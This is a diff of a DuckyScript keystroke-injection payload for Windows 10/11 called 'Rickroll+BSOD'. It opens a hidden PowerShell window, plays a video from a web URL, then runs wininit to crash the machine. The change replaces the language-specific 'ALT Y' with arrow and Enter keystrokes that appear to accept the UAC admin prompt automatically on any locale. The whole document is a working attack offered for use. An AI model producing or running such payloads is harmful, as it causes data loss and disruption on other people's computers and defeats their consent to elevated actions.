@@ -1,21 +1,21 @@
 REM Author: H4K0N42
 REM Title: Rickroll+BSOD
 REM Target: Windows 10/11
-REM Description: Rickrolls the target and crashes the pc
+REM Description: Rickrolls the Target and crashes the PC.
 
 
 REM Run Attack
 GUI r
 DELAY 250
-STRING powershell -w hidden "start https://shattereddisk.github.io/rickroll/rickroll.mp4; timeout /NOBREAK /t 20; wininit"
+STRING powershell -w hidden "start https://H4K0N42.github.io/nggyu/video.webm; timeout /NOBREAK /t 20; wininit"
 
 
 REM Get Admin-Permission
 CTRL SHIFT ENTER
 DELAY 750
-
-REM !!!CHANGE THIS TO YOUR LANGUAGE!!! (ALT+Y for "Yes" in English, ALT+J for "Ja" in German)
-ALT Y
+LEFT
+DELAY 100
+ENTER
 
 
 REM Fullscreen Rickroll
